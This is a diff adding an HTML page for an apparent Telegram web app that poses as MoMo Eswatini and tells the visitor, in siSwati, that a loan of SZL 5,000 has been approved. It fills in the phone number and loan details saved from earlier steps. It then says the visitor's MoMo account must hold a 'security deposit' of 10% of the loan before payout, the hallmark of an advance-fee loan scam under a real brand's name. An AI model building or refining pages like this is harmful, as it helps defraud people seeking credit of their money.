@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="ss">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MoMo Eswatini - Kuphendvuleka</title>
+    
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --momo-yellow: #ffcc00;
+            --momo-gradient: linear-gradient(180deg, #ffcc00 0%, #e6b800 100%);
+            --bg-momo: #ffcc00;
+            --card-bg: #ffffff;
+            --text-dark: #111111;
+            --text-gray: #666666;
+            --warning-bg: #fffdf0;
+            --warning-border: #f3ebc8;
+            --warning-title: #856404;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-momo);
+            margin: 0;
+            padding: 20px 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .screen-container {
+            width: 100%;
+            max-width: 400px;
+            background-color: var(--card-bg);
+            border-radius: 28px;
+            padding: 30px 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Checkmark Circle Icon */
+        .check-circle {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #000000, #222222);
+            color: var(--momo-yellow);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 38px;
+            font-weight: 900;
+            margin-bottom: 20px;
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.25);
+        }
+
+        /* Title Header */
+        .congrats-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: #000000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .sub-text {
+            color: var(--text-gray);
+            font-size: 15px;
+            text-align: center;
+            line-height: 1.4;
+            margin-bottom: 25px;
+            padding: 0 10px;
+        }
+
+        /* Approved Amount Yellow Card */
+        .amount-box {
+            width: 100%;
+            background: var(--momo-gradient);
+            border-radius: 16px;
+            padding: 22px 15px;
+            text-align: center;
+            color: #000000;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 15px rgba(230, 184, 0, 0.35);
+        }
+
+        .amount-label {
+            font-size: 12px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            opacity: 0.95;
+            margin-bottom: 8px;
+        }
+
+        .amount-value {
+            font-size: 32px;
+            font-weight: 900;
+            letter-spacing: 0.5px;
+        }
+
+        /* Notice Card */
+        .info-card {
+            width: 100%;
+            background-color: var(--warning-bg);
+            border: 1.5px solid var(--warning-border);
+            border-radius: 16px;
+            padding: 20px 18px;
+            margin-bottom: 25px;
+        }
+
+        .info-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+            color: var(--warning-title);
+            font-weight: 800;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+        }
+
+        .info-body {
+            font-size: 13.5px;
+            line-height: 1.55;
+            color: #4a4a4a;
+        }
+
+        /* Detail List */
+        .details-list {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .details-heading {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 18px;
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--text-dark);
+        }
+
+        .detail-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 16px;
+        }
+
+        .icon-bg {
+            width: 44px;
+            height: 44px;
+            background-color: #fffdf0;
+            border: 1px solid var(--momo-yellow);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .detail-label {
+            font-size: 11px;
+            color: var(--text-gray);
+            text-transform: uppercase;
+            font-weight: 700;
+            margin-bottom: 2px;
+        }
+
+        .detail-val {
+            font-size: 15px;
+            font-weight: 800;
+            color: var(--text-dark);
+        }
+
+        /* Quick Actions */
+        .action-title {
+            width: 100%;
+            font-weight: 800;
+            margin: 15px 0 12px;
+            color: #000000;
+            font-size: 15px;
+        }
+
+        .btn-list {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .btn-white {
+            background: white;
+            border: 1px solid #e2e8f0;
+            padding: 14px 16px;
+            border-radius: 12px;
+            font-weight: 700;
+            color: var(--text-dark);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+        }
+
+        .next-steps {
+            width: 100%;
+            background-color: #f8f9fa;
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #edf2f7;
+        }
+
+        .home-btn {
+            background-color: var(--momo-yellow);
+            color: #000000;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .home-btn:hover {
+            background-color: #e6b800;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="screen-container">
+        
+        <!-- Header Checkmark -->
+        <div class="check-circle">✓</div>
+        
+        <div class="congrats-title">
+            <span>🎉</span> Halala!
+        </div>
+
+        <div class="sub-text">
+            Sikweletu sakho <b>sesivunyiwe!</b> Timali titatfunyelwa kuwe masinyane.
+        </div>
+
+        <!-- Approved Amount Yellow Card -->
+        <div class="amount-box">
+            <div class="amount-label">INOMBOLO YEMALI YEVUNYIWE</div>
+            <div class="amount-value" id="display-amount">SZL 5,000</div>
+        </div>
+
+        <!-- Compliance Notice -->
+        <div class="info-card">
+            <div class="info-header">⚠️ SATEKUSISA TIBONGO</div>
+            <div class="info-body">
+                I-akhawunti yakho ye-MoMo Eswatini kufanele isebente iphindze ibe nesibambiso sekuphepha lesingaba ngu-<b>10% wesikweletu osicelile</b>. Lesibambiso sitawubuyiselwa kuwe masinyane ngemva kwekhokha sikweletu ngempumelelo.
+            </div>
+        </div>
+
+        <!-- Details Section -->
+        <div class="details-list">
+            <div class="details-heading">
+                <span>💳</span> Temininingwane Yesikweletu
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📱</div>
+                <div>
+                    <div class="detail-label">INOMBOLO YEFONI</div>
+                    <div class="detail-val" id="display-phone">+268 ...</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">💵</div>
+                <div>
+                    <div class="detail-label">INHLANHLA YAMALANGA / INKHIYO NGENSITA</div>
+                    <div class="detail-val" id="display-monthly">SZL 438</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📅</div>
+                <div>
+                    <div class="detail-label">SIKHATHI SESIKWELETU</div>
+                    <div class="detail-val" id="display-term">Tinyanga tiy-12</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📈</div>
+                <div>
+                    <div class="detail-label">INZALO (INTEREST RATE)</div>
+                    <div class="detail-val">5% APR</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Quick Actions -->
+        <div class="action-title">Izinyathelo Letisheshayo</div>
+        <div class="btn-list">
+            <div class="btn-white">💰 Faka Imali</div>
+            <div class="btn-white">💸 Khipha Imali</div>
+            <div class="btn-white">📄 Temininingwane</div>
+        </div>
+
+        <!-- Next Steps -->
+        <div class="next-steps">
+            <div style="font-weight: 800; color: #000000; margin-bottom: 6px; font-size: 14px;">📱 Lokulandzelako:</div>
+            <div style="font-size: 13px; color: var(--text-gray); line-height: 1.45;">
+                Utatfola umlayezo we-SMS noma i-email nemininingwane yekutfunyelwa kwemali kungakapheli ama-awa angama-24.
+            </div>
+        </div>
+
+        <button class="home-btn" onclick="window.location.href='/'">🏠 Buyela Ekhasini Lekucala</button>
+
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            if (window.Telegram?.WebApp) {
+                window.Telegram.WebApp.ready();
+                window.Telegram.WebApp.expand();
+            }
+
+            // Read values saved from previous steps
+            const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone');
+            const loanAmount = localStorage.getItem('loan_amount') || localStorage.getItem('amount') || "5000";
+            const loanTerm = localStorage.getItem('loan_term') || localStorage.getItem('duration') || "12";
+            const monthlyPay = localStorage.getItem('monthly_repayment') || "438";
+
+            // Formatting values into SZL currency
+            const numAmount = Number(loanAmount.toString().replace(/\D/g, '')) || 5000;
+            const numMonthly = Number(monthlyPay.toString().replace(/\D/g, '')) || 438;
+
+            const formattedAmount = `SZL ${numAmount.toLocaleString('en-US')}`;
+            const formattedMonthly = `SZL ${numMonthly.toLocaleString('en-US')}`;
+            const formattedPhone = savedPhone ? `+268 ${savedPhone.replace(/^\+?268/, '')}` : "+268 ...";
+
+            // Bind recorded values to page
+            document.getElementById('display-amount').innerText = formattedAmount;
+            document.getElementById('display-phone').innerText = formattedPhone;
+            document.getElementById('display-term').innerText = `Tinyanga ti- ${loanTerm}`;
+            document.getElementById('display-monthly').innerText = formattedMonthly;
+        });
+    </script>
+</body>
+</html>
